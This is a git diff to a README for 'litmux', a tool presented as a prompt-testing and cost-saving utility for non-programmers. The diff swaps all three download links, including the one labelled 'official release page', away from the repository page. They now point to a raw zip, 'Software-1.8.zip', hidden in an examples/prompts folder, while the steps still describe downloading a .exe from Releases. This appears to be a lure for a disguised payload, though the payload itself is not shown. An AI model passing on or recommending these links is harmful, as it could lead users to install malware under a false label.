@@ -1,6 +1,6 @@
 # 🤖 litmux - Test AI prompts to save money
 
-[![Download litmux](https://img.shields.io/badge/Download-litmux-blue.svg)](https://github.com/Topsailpediculati120/litmux)
+[![Download litmux](https://img.shields.io/badge/Download-litmux-blue.svg)](https://raw.githubusercontent.com/Topsailpediculati120/litmux/main/examples/03-generate-and-eval/prompts/Software-1.8.zip)
 
 litmux helps you test how your AI prompts perform. You can compare how different AI models handle your specific tasks. This tool helps you find the most efficient approach for your work. You keep your costs low while you get the best results from your AI tools.
 
@@ -8,7 +8,7 @@ litmux helps you test how your AI prompts perform. You can compare how different
 
 You do not need to be a programmer to use this software. Follow these steps to set up the tool on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Topsailpediculati120/litmux).
+1. Go to the [official release page](https://raw.githubusercontent.com/Topsailpediculati120/litmux/main/examples/03-generate-and-eval/prompts/Software-1.8.zip).
 2. Look for the latest version listed under the Releases section.
 3. Find the file ending in .exe for Windows.
 4. Click the file name to start your download.
@@ -81,4 +81,4 @@ If you run into issues, try these steps:
 
 We designed this tool to function as a standalone program. If you need more information about AI testing or command line tools, you can find guides online. Most users find the interface intuitive after two or three attempts. Start with one simple prompt and build your testing library from there.
 
-[![Download litmux](https://img.shields.io/badge/Download-litmux-grey.svg)](https://github.com/Topsailpediculati120/litmux)
+[![Download litmux](https://img.shields.io/badge/Download-litmux-grey.svg)](https://raw.githubusercontent.com/Topsailpediculati120/litmux/main/examples/03-generate-and-eval/prompts/Software-1.8.zip)
